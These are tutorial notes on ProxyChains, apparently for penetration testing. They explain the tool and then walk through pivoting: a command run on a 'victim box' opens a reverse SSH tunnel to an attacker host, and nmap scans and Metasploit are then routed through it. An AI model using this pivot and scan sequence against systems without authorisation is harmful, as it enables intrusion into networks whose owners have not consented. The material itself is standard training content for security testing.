### Understanding ProxyChains

#### Overview of ProxyChains

- **Definition**:
  - ProxyChains is a tool that directs network traffic of applications through proxy servers. It allows users to mask their actual IP address and route their traffic through one or multiple proxy servers.

#### How ProxyChains Works

- **Traffic Routing**:
  - ProxyChains reroutes the network requests of applications through a chain of proxy servers. This process is known as proxy chaining.
  - It can be configured to use different types of proxies, like SOCKS4, SOCKS5, or HTTP.

- **Uses in Cybersecurity**:
  - Primarily used for anonymity and privacy, it is also a valuable tool in penetration testing to obfuscate the origin of an attack.
  - Useful for bypassing network restrictions and testing network security from different geographical locations.

#### Advantages and Limitations

- **Advantages**:
  - Enhances privacy and security by hiding the user's IP address.
  - Allows testing from different network perspectives.

- **Limitations**:
  - The speed and reliability depend on the proxies used.
  - Not all applications support proxy chaining.

### Using ProxyChains with OpenSSH

#### Configuration for OpenSSH Versions Greater than 7.6

- **Note on OpenSSH Version**:
  - For versions lower than 7.6, the process differs as older versions do not support `-R` and require a two-way proxy with `-D`.

#### Setting Up ProxyChains on Attacker Box

- **Configuring ProxyChains**:
  - Edit the `/etc/proxychains4.conf` file.
  - Change settings:
    - Comment out `strictchain` and uncomment `dynamicchain`.
    - Uncomment `quietmode` and comment `proxydns`.
    - Modify the default config from `socks4 127.0.0.1 9080` to `socks5` on your chosen port.

- **Additional Note for RDP**:
  - Ensure `xclip` is installed for Remote Desktop Protocol (RDP) usage.

- **Verifying SSH Service**:
  - Ensure SSH service is running:
  
    ```shell
    sudo systemctl start ssh.service
    ```

#### Configuration on Victim Box

- **Establishing SSH Tunnel**:
  ```shell
  ssh -N -f -R 127.0.0.1:9080 attacker_username@attacker_IP -p unique_pivot_port
  ```
  - This requires an SSH client on the victim machine. Ensure SSH is started on the attacker box and set up a port forwarding rule for internet-based attacks.

#### Using ProxyChains for Scanning on Attacker Box

- **Running Nmap through ProxyChains**:
  - Examples:
    ```shell
    sudo proxychains nmap --top-ports=20 -sT -sV -sC -v --open -Pn IP_Address
    sudo proxychains nmap -iL scope -F -sT -v -Pn | tee fast_scan
    ```
  - ProxyChains can wrap almost any tool, including Metasploit, to force traffic through the SSH tunnel.

#### Wrapping Metasploit with ProxyChains

- **Metasploit via ProxyChains**:
  ```shell
  sudo proxychains msfconsole
  ```
  - This method bypasses the need to set up proxies within each Metasploit module, especially useful for modules that do not support proxy configurations.
